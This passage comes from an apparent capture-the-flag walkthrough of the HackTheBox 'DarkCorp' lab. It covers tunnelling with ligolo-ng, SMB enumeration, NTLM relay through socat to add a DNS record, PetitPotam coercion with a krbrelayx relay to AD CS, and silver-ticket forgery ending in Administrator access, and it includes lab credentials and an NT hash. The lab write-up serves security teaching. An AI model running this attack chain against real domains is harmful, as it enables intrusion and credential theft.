+ebelford@drip.htb&#39;s password: 
+Linux drip 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have no mail.
+Last login: Mon Sep  7 13:45:42 2026 from 172.16.20.1
+ebelford@drip:~$</code></pre><p>I now have access as this user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ebelford@drip:~$ ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:15:5d:84:03:02 brd ff:ff:ff:ff:ff:ff
+    inet 172.16.20.3/24 brd 172.16.20.255 scope global eth0
+       valid_lft forever preferred_lft forever
+ebelford@drip:~$</code></pre><p>Ill have a look at the internal network, since this machine is supposed to be a AD machine, so im assuming this is doman joined</p><p>There is also a keytab file, which i need to be root to read</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ebelford@drip:~$ ping 172.16.20.2   
+PING 172.16.20.2 (172.16.20.2) 56(84) bytes of data.
+64 bytes from 172.16.20.2: icmp_seq=1 ttl=128 time=0.768 ms
+64 bytes from 172.16.20.2: icmp_seq=2 ttl=128 time=0.764 ms
+^C
+--- 172.16.20.2 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1010ms
+rtt min/avg/max/mdev = 0.764/0.766/0.768/0.002 ms
+ebelford@drip:~$ ping 172.16.20.1
+PING 172.16.20.1 (172.16.20.1) 56(84) bytes of data.
+64 bytes from 172.16.20.1: icmp_seq=1 ttl=128 time=0.559 ms
+64 bytes from 172.16.20.1: icmp_seq=2 ttl=128 time=0.508 ms
+^C
+--- 172.16.20.1 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1032ms
+rtt min/avg/max/mdev = 0.508/0.533/0.559/0.025 ms
+ebelford@drip:~$ </code></pre><p>I can ping two more hosts here</p><p>However is stops at <code>.4</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ebelford@drip:~$ cat /etc/hosts
+127.0.0.1	localhost drip.htb mail.drip.htb dev-a3f1-01.drip.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
+172.16.20.3 drip.darkcorp.htb
+ebelford@drip:~$</code></pre><p>I can also check <code>/etc/hosts</code> and i see <code>.1</code> is the DC</p><p>Not sure what <code>.2</code> is as of yet</p><p>I will setup a proxy to access the internal network</p><h2>Setting up ligolo-ng to access internal network</h2><p>So to start ill download the latest release of the linux agent and linux proxy</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo ./proxy -selfcert           
+[sudo] password for kali: 
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] daemon configuration file not found. Creating a new one... 
+? Enable Ligolo-ng WebUI? No
+WARN[0001] Using default selfcert domain &#39;ligolo&#39;, beware of CTI, SOC and IoC! 
+ERRO[0001] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
+INFO[0001] Listening on 0.0.0.0:11601                   
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+  Version: 0.9.1
+
+ligolo-ng »</code></pre><p>Ill start the proxy on my machine</p><p>Ill use scp to transfer the agent to the target</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">scp agent ebelford@drip.htb:/tmp/</code></pre><p>This transferred it to the target</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ebelford@drip:/tmp$ chmod +x agent
+ebelford@drip:/tmp$ ./agent -connect 10.10.14.61:11601 --ignore-cert
+WARN[0000] warning, certificate validation disabled     
+INFO[0000] Connection established                        addr=&quot;10.10.14.61:11601&quot;</code></pre><p>Ill then send the connection back</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ligolo-ng » session
+? Specify a session : 1 - ebelford@drip - 10.129.232.7:58262 - 00155d840302
+[Agent : ebelford@drip] » 
+[Agent : ebelford@drip] » 
+[Agent : ebelford@drip] » ifcreate --name ligolo
+INFO[0115] Creating a new ligolo interface...           
+INFO[0115] Interface created!                           
+[Agent : ebelford@drip] » ifconfig
+┌────────────────────────────────────┐
+│ Interface 0                        │
+├──────────────┬─────────────────────┤
+│ Name         │ lo                  │
+│ Hardware MAC │                     │
+│ MTU          │ 65536               │
+│ Flags        │ up|loopback|running │
+│ IPv4 Address │ 127.0.0.1/8         │
+└──────────────┴─────────────────────┘
+┌───────────────────────────────────────────────┐
+│ Interface 1                                   │
+├──────────────┬────────────────────────────────┤
+│ Name         │ eth0                           │
+│ Hardware MAC │ 00:15:5d:84:03:02              │
+│ MTU          │ 1500                           │
+│ Flags        │ up|broadcast|multicast|running │
+│ IPv4 Address │ 172.16.20.3/24                 │
+└──────────────┴────────────────────────────────┘
+[Agent : ebelford@drip] » route_add --name ligolo --route 172.16.20.0/24
+INFO[0194] Route created.                               
+[Agent : ebelford@drip] » tunnel_start 
+INFO[0205] Starting tunnel to ebelford@drip (00155d840302) 
+[Agent : ebelford@drip] »  </code></pre><p>Then ill attach to the session make the new interface and add the routing info, then finally start the tunnel</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ping 172.16.20.2
+PING 172.16.20.2 (172.16.20.2) 56(84) bytes of data.
+64 bytes from 172.16.20.2: icmp_seq=1 ttl=64 time=49.3 ms
+64 bytes from 172.16.20.2: icmp_seq=2 ttl=64 time=43.3 ms
+64 bytes from 172.16.20.2: icmp_seq=3 ttl=64 time=48.2 ms</code></pre><p>I can now ping the internal network</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb 172.16.20.0/24                                                       
+SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
+Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00</code></pre><p>I can now enumerate both of these hosts</p><h2>Nmap on internal network</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- -sT -Pn 172.16.20.1-2
+
+Nmap scan report for dc-01.darkcorp.htb (172.16.20.1)
+Host is up (0.028s latency).
+Not shown: 65506 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+2179/tcp  open  vmrdp
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49670/tcp open  unknown
+57237/tcp open  unknown
+58099/tcp open  unknown
+58304/tcp open  unknown
+58315/tcp open  unknown
+58347/tcp open  unknown
+58351/tcp open  unknown
+
+Nmap scan report for web-01 (172.16.20.2)
+Host is up (0.019s latency).
+Not shown: 65520 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5000/tcp  open  upnp
+5985/tcp  open  wsman
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49671/tcp open  unknown</code></pre><p>So the webserver on the DC on port 80 is the web drip mail web service</p><p>The one running on 443 is just default IIS</p><p>The webserver on port 80 of the web-01 server is also default IIS</p><h2>Enumeration on internal hosts</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">┌──❰kali@kali❱──❰192.168.86.128❱──❰~/htb/darkcorp❱─────────────────────────────────────────────────── 18:11:54
+└──╼ 󰽢 nxc smb dc-01.darkcorp.htb -u &#39;victor.r&#39; -p &#39;&#39; -k
+SMB         dc-01.darkcorp.htb 445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc-01.darkcorp.htb 445    DC-01            [-] darkcorp.htb\victor.r: KDC_ERR_PREAUTH_FAILED 
+                                                                                                              
+
+┌──❰kali@kali❱──❰192.168.86.128❱──❰~/htb/darkcorp❱─────────────────────────────────────────────────── 18:16:51
+└──╼ 󰽢 nxc smb web-01.darkcorp.htb -u &#39;victor.r&#39; -p &#39;&#39; -k
+SMB         web-01.darkcorp.htb 445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
+SMB         web-01.darkcorp.htb 445    WEB-01           [-] darkcorp.htb\victor.r: KDC_ERR_PREAUTH_FAILED</code></pre><p>The user i found earlier <code>victor.r</code> is valid on both hosts, however ebelford is not</p><h2>Initial access on internal network</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">┌──❰kali@kali❱──❰192.168.86.128❱──❰~/htb/darkcorp❱─────────────────────────────────────────────────── 18:19:30
+└──╼ 󰽢 nxc smb web-01.darkcorp.htb -u &#39;victor.r&#39; -p &#39;victor1gustavo@#&#39; -k
+SMB         web-01.darkcorp.htb 445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
+SMB         web-01.darkcorp.htb 445    WEB-01           [+] darkcorp.htb\victor.r:victor1gustavo@# 
+                                                                                                              
+
+┌──❰kali@kali❱──❰192.168.86.128❱──❰~/htb/darkcorp❱─────────────────────────────────────────────────── 18:19:37
+└──╼ 󰽢 nxc smb dc-01.darkcorp.htb -u &#39;victor.r&#39; -p &#39;victor1gustavo@#&#39; -k
+SMB         dc-01.darkcorp.htb 445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc-01.darkcorp.htb 445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# </code></pre><p>The cracked password found earlier gets me initial access on both hosts</p><p>It does not get me access over SSH on the DC</p><h3>Shares</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb web-01.darkcorp.htb -u &#39;victor.r&#39; -p &#39;victor1gustavo@#&#39; --shares
+SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
+SMB         172.16.20.2     445    WEB-01           [+] darkcorp.htb\victor.r:victor1gustavo@# 
+SMB         172.16.20.2     445    WEB-01           [*] Enumerated shares
+SMB         172.16.20.2     445    WEB-01           Share           Permissions     Remark
+SMB         172.16.20.2     445    WEB-01           -----           -----------     ------
+SMB         172.16.20.2     445    WEB-01           ADMIN$                          Remote Admin
+SMB         172.16.20.2     445    WEB-01           C$                              Default share
+SMB         172.16.20.2     445    WEB-01           IPC$            READ            Remote IPC</code></pre><p>Read access on <code>IPC$</code> on the web-01 machine</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc-01.darkcorp.htb -u &#39;victor.r&#39; -p &#39;victor1gustavo@#&#39; --shares
+SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
+SMB         172.16.20.1     445    DC-01            [*] Enumerated shares
+SMB         172.16.20.1     445    DC-01            Share           Permissions     Remark
+SMB         172.16.20.1     445    DC-01            -----           -----------     ------
+SMB         172.16.20.1     445    DC-01            ADMIN$                          Remote Admin
+SMB         172.16.20.1     445    DC-01            C$                              Default share
+SMB         172.16.20.1     445    DC-01            CertEnroll      READ            Active Directory Certificate Services share
+SMB         172.16.20.1     445    DC-01            IPC$            READ            Remote IPC
+SMB         172.16.20.1     445    DC-01            NETLOGON        READ            Logon server share 
+SMB         172.16.20.1     445    DC-01            SYSVOL          READ            Logon server share</code></pre><p>Read access on the <code>CertEnroll</code> share</p><h3>Users</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc-01.darkcorp.htb -u &#39;victor.r&#39; -p &#39;victor1gustavo@#&#39; --rid-brute 20000 | grep &#39;(SidTypeUser)&#39; | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC-01$
+victor.r
+svc_acc
+john.w
+angela.w
+angela.w.adm
+taylor.b
+DRIP$
+taylor.b.adm</code></pre><p>Ill use --rid-brute to dump and create a user list</p><p>There are no kerberoastable users, and no asreproastable users</p><p>No writable objects as <code>victor.r</code></p><p>Nothing in bloodhound</p><p>No password reuse</p><h2>Internal web service running on port 5000 (<code>web-01</code>)</h2><p><img src="images/darkcorp/pasted-image-20260909193244.webp" alt="Screenshot" loading="lazy" /></p><p>When browsing to it, i get prompted for a native logon, <code>victor.r</code> credentials work</p><p><img src="images/darkcorp/pasted-image-20260909202556.webp" alt="Screenshot" loading="lazy" /></p><p>This page looks interesting</p><p>Ill use curl to play with this request, the response shows <code>negotiate</code> as the <code>www-authenticate</code> header, which means it accepts kerberos auth</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc-01.darkcorp.htb -u victor.r -p &#39;victor1gustavo@#&#39; --generate-tgt victor
+SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
+SMB         172.16.20.1     445    DC-01            [+] TGT saved to: victor.ccache
+SMB         172.16.20.1     445    DC-01            [+] Run the following command to use the TGT: export KRB5CCNAME=victor.ccache
+
+sudo nxc smb dc-01.darkcorp.htb -u victor.r -p &#39;victor1gustavo@#&#39; --generate-krb5-file /etc/krb5.conf 
+[sudo] password for kali: 
+SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.20.1     445    DC-01            [+] krb5 conf saved to: /etc/krb5.conf
+SMB         172.16.20.1     445    DC-01            [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
+SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@#</code></pre><p>Ill generate both</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">export KRB5_CONFIG=/etc/krb5.conf
+export KRB5CCNAME=victor.ccache</code></pre><p>Then ill export them</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -X POST --negotiate -u &#39;:&#39; http://web-01.darkcorp.htb:5000/status -H &#39;Content-Type: application/json&#39; -d &#39;{&quot;protocol&quot;:&quot;http&quot;,&quot;host&quot;:&quot;drip.darkcorp.htb&quot;,&quot;port&quot;:&quot;80&quot;}&#39;  
+{&quot;message&quot;:&quot;http://drip.darkcorp.htb:80 is up!&quot;,&quot;status&quot;:&quot;Success!&quot;}</code></pre><p>I can now send the request and get a response back</p><p>When trying an IP address it fails, saying <code>Invalid Input</code> likely meaning you cant put an IP address there</p><p>Its also not possible to add a DNS record in this situation for my own machine using <code>victor.r</code> credentials</p><p>So i cannot capture the NTLM hash of the user using responder</p><h2>Adding malicious DNS record</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ebelford@drip:/tmp$ ./socat TCP-LISTEN:8080,bind=0.0.0.0,fork TCP:10.10.14.61:80</code></pre><p>Ill get a statically compiled socat binary on the SSH target, then set it to listen on port 8080 and forward traffic back to me on <code>10.10.14.61:80</code>, im doing this becuase i cannot get it to connect back to me directly, so ill get it to connect to the drip server then forward the auth to me using socat</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ntlmrelayx.py -t ldap://dc-01.darkcorp.htb -smb2support 
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client RPC loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client WINRMS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Setting up WinRM (HTTP) Server on port 5985
+[*] Setting up WinRMS (HTTPS) Server on port 5986
+[*] Setting up RPC Server on port 135
+[*] Setting up MSSQL Server on port 1433
+[*] Setting up RDP Server on port 3389
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections</code></pre><p>Since i cant use responder to grab the hash, ill use ntlm relay initially just to see what user account its authenticating as!</p><p><img src="images/darkcorp/pasted-image-20260910181353.webp" alt="Screenshot" loading="lazy" /></p><p>Then ill send the request back to the drip server on port 8080 where socat is listening</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[*] Servers started, waiting for connections
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Connection from 10.129.232.7 controlled, attacking target ldap://dc-01.darkcorp.htb
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Authenticating connection from DARKCORP/SVC_ACC@10.129.232.7 against ldap://dc-01.darkcorp.htb SUCCEED [1]
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -&gt; Enumerating relayed user&#39;s privileges. This may take a while on large domains
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -&gt; Dumping domain info for first time
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -&gt; Domain info dumped into lootdir!</code></pre><p>So the purpose of this was not to exploit anything as of yet, instead i just wanted to see the user account its running and authenticating as, i now know its <code>svc_acc</code></p><p><img src="images/darkcorp/pasted-image-20260910181633.webp" alt="Screenshot" loading="lazy" /></p><p>This user is part of the DNSADMINS group, this means i can add DNS records as this user, this is especially important in this situation since regular users cannot add DNS records in this environment</p><p>So the plan is to setup ntlmrelay once again and get it to use the authentication to add a DNS record pointing back at my IP, its still important i have socat running</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ntlmrelayx.py -t ldap://dc-01.darkcorp.htb --add-dns-record &#39;dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA&#39; 10.10.14.61
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client RPC loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client WINRMS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Setting up WinRM (HTTP) Server on port 5985
+[*] Setting up WinRMS (HTTPS) Server on port 5986
+[*] Setting up RPC Server on port 135
+[*] Setting up MSSQL Server on port 1433
+[*] Setting up RDP Server on port 3389
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections</code></pre><p>Ill start this up, still with socat running</p><p>Ill then send the request again through the web portal to connect back to drip server which will then relay it back to me</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[*] Servers started, waiting for connections
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Connection from 10.129.232.7 controlled, attacking target ldap://dc-01.darkcorp.htb
+[*] (HTTP): Client requested path: /
+[*] (HTTP): Authenticating connection from DARKCORP/SVC_ACC@10.129.232.7 against ldap://dc-01.darkcorp.htb SUCCEED [1]
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -&gt; Enumerating relayed user&#39;s privileges. This may take a while on large domains
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -&gt; Checking if domain already has a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` DNS record
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -&gt; Domain does not have a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` record!
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -&gt; Adding `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` pointing to `10.10.14.61` at `DC=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA,DC=darkcorp.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=darkcorp,DC=htb`
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -&gt; Added `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`. DON&#39;T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -&gt; Dumping domain info for first time
+[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -&gt; Domain info dumped into lootdir!</code></pre><p>It looks to have worked</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc-01.darkcorp.htb -d darkcorp.htb -u victor.r -p &#39;victor1gustavo@#&#39; get dnsDump
+
+recordName: dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.darkcorp.htb
+A: 10.10.14.61</code></pre><p>Then ill query DNS and i see that the record is there</p><h2>Certificate retrieval for <code>web-01$</code></h2><p>Now i can proceed with coercing auth from the <code>web-01</code> machine back to me then use krbrelay to relay it to the cert enrollment endpoint hopefully getting me a pfx as the <code>web-01</code> user</p><p><a href="https://github.com/dirkjanm/krbrelayx" target="_blank" rel="noreferrer">https://github.com/dirkjanm/krbrelayx</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 krbrelayx.py -t https://dc-01.darkcorp.htb/certsrv/certfnsh.asp --adcs -v &#39;web-01$&#39;
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client SMB loaded..
+[*] Running in attack mode to single host
+[*] Running in kerberos relay mode because no credentials were specified.
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up DNS Server
+
+[*] Servers started, waiting for connections</code></pre><p>Ill start up krbrelayx</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb web-01.darkcorp.htb -u victor.r -p &#39;victor1gustavo@#&#39; -M coerce_plus -o LISTENER=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
+SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
+SMB         172.16.20.2     445    WEB-01           [+] darkcorp.htb\victor.r:victor1gustavo@# 
+COERCE_PLUS 172.16.20.2     445    WEB-01           VULNERABLE, PetitPotam
+COERCE_PLUS 172.16.20.2     445    WEB-01           Exploit Success, efsrpc\EfsRpcAddUsersToFile
+COERCE_PLUS 172.16.20.2     445    WEB-01           VULNERABLE, PrinterBug
+COERCE_PLUS 172.16.20.2     445    WEB-01           Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
+COERCE_PLUS 172.16.20.2     445    WEB-01           VULNERABLE, MSEven</code></pre><p>Then ill use the nxc module for coersion</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[*] Servers started, waiting for connections
+[*] SMBD: Received connection from 10.129.232.7
+[*] HTTP server returned status code 200, treating as a successful login
+[*] SMBD: Received connection from 10.129.232.7
+[*] HTTP server returned status code 200, treating as a successful login
+[*] Generating CSR...
+[*] CSR generated!
+[*] Getting certificate...
+[*] SMBD: Received connection from 10.129.232.7
+[*] HTTP server returned status code 200, treating as a successful login
+[*] SMBD: Received connection from 10.129.232.7
+[*] HTTP server returned status code 200, treating as a successful login
+[*] SMBD: Received connection from 10.129.232.7
+[-] Unsupported MechType &#39;NTLMSSP - Microsoft NTLM Security Support Provider&#39;
+[*] SMBD: Received connection from 10.129.232.7
+[-] Unsupported MechType &#39;NTLMSSP - Microsoft NTLM Security Support Provider&#39;
+[*] Skipping user web-01$ since attack was already performed
+[*] GOT CERTIFICATE! ID 6
+[*] Skipping user web-01$ since attack was already performed
+[*] Writing PKCS#12 certificate to ./web-01.pfx
+[*] Certificate successfully written to file
+[*] Skipping user web-01$ since attack was already performed</code></pre><p>I now have the certificate for the <code>web-01$</code> user</p><h2>Administrator on <code>web-01</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad auth -pfx web-01.pfx -dc-ip 172.16.20.1                                               
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN DNS Host Name: &#39;WEB-01.darkcorp.htb&#39;
+[*]     Security Extension SID: &#39;S-1-5-21-3432610366-2163336488-3604236847-20601&#39;
+[*] Using principal: &#39;web-01$@darkcorp.htb&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;web-01.ccache&#39;
+[*] Wrote credential cache to &#39;web-01.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;web-01$&#39;
+[*] Got hash for &#39;web-01$@darkcorp.htb&#39;: aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675</code></pre><p>Ill grab the NT hash, i can now use this to forge a silver ticket for the administrator</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ticketer.py -nthash &#39;8f33c7fc7ff515c1f358e488fbb8b675&#39; -domain-sid &#39;S-1-5-21-3432610366-2163336488-3604236847&#39; -domain darkcorp.htb -spn &#39;cifs/web-01.darkcorp.htb&#39; Administrator 
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for darkcorp.htb/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving/Updating ticket in Administrator.ccache</code></pre><p>I now have a TGT for the administrator</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">mv Administrator.ccache administrator-web-01.ccache
+export KRB5CCNAME=administrator-web-01.ccache</code></pre><p>Ill export he TGT</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb web-01.darkcorp.htb --use-kcache 
+SMB         web-01.darkcorp.htb 445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
+SMB         web-01.darkcorp.htb 445    WEB-01           [+] DARKCORP.HTB\Administrator from ccache (Pwn3d!)</code></pre><p>The administrator is now compromised!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb web-01.darkcorp.htb --use-kcache --sam
+SMB         web-01.darkcorp.htb 445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
+SMB         web-01.darkcorp.htb 445    WEB-01           [+] DARKCORP.HTB\Administrator from ccache (Pwn3d!)
